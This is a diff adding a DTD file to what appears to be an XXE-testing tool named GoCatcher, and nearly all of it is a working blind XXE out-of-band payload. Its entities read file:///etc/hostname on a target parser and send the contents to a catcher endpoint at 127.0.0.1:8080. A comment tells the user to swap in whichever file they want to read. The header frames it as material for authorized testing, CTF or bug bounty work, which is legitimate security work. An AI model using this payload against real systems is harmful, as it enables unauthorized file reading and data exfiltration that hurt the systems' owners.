@@ -1,0 +1,11 @@
+<!-- ===========================================================================
+     GoCatcher :: XXE out-of-band DTD  (application/xml-dtd)
+     FOR AUTHORIZED TESTING / CTF / BUG BOUNTY ONLY.
+     Hosted by GoCatcher at /evil.dtd and referenced by the blind-XXE payload
+     in xxe.xml. Reads a local file on the target and exfiltrates it to the
+     catcher's /xxe-oob endpoint (visible in the request log).
+     Change file:///etc/hostname to the file you are authorized to read.
+     =========================================================================== -->
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://127.0.0.1:8080/xxe-oob?data=%file;'>">
+%eval;
